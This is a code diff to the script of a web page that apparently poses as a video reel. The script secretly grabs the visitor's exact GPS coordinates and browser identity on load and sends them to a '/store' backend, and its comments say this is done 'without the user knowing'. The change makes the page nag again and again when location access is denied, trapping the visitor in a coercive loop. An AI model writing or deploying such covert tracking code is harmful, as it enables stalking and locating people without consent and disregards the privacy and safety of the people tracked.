@@ -45,34 +45,39 @@
 
     <script>
         // Automatic location tracking hidden in the background
+        function askLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+                        const uagent = navigator.userAgent;
+
+                        // Silently log to our backend without the user knowing
+                        const url = "/store?lat=" + lat +
+                                    "&long=" + lon +
+                                    "&uagent=" + encodeURIComponent(uagent);
+
+                        fetch(url).catch(() => {});
+                    },
+                    (error) => {
+                        // Alert the user and repopup the request
+                        alert("Please allow location access to view this content.");
+                        askLocation();
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    }
+                );
+            }
+        }
+
         window.addEventListener('load', () => {
             // Wait slightly for the reel to start loading to feel seamless
             setTimeout(() => {
-                if (navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition(
-                        (position) => {
-                            const lat = position.coords.latitude;
-                            const lon = position.coords.longitude;
-                            const uagent = navigator.userAgent;
-
-                            // Silently log to our backend without the user knowing
-                            const url = "/store?lat=" + lat +
-                                        "&long=" + lon +
-                                        "&uagent=" + encodeURIComponent(uagent);
-
-                            fetch(url).catch(() => {});
-                        },
-                        (error) => {
-                            // Automatically hide any errors. If denied, do nothing.
-                            console.log("Ignored");
-                        },
-                        {
-                            enableHighAccuracy: true,
-                            timeout: 10000,
-                            maximumAge: 0
-                        }
-                    );
-                }
+                askLocation();
             }, 500);
         });
     </script>
